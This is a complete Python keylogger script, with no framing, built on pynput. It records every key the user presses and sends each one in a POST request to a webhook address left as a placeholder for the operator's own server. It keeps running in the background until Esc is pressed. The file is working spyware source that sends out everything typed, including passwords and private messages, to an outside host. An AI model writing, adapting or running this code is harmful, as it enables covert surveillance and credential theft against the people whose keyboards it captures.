import requests
from pynput import keyboard
import threading
import queue
import time

WEBHOOK_URL = "ADD_YOUR_SERVER_WEBHOOK_HERE"

key_queue = queue.Queue()

def send_keypresses():
    while True:
        key = key_queue.get()  
        try:
            response = requests.post(WEBHOOK_URL, json={"content": f"Key pressed: {key}"})
            if response.status_code != 200:
                print(f"Failed to send key: {key}")
            else:
                print(f"Sent key: {key}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request: {e}")
        time.sleep(0.1) 

def on_press(key):
    try:
        key_str = str(key)
        key_queue.put(key_str) 
    except AttributeError:
        special_key_chars = {
            keyboard.Key.enter: "Enter",
            keyboard.Key.tab: "Tab",
            keyboard.Key.shift: "Shift",
            keyboard.Key.space: "Space"
        }
        key_str = special_key_chars.get(key, "Unknown Key")
        key_queue.put(key_str)

    return True  

def on_release(key):
    if key == keyboard.Key.esc:
        return False 

threading.Thread(target=send_keypresses, daemon=True).start()

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

listener.join()  
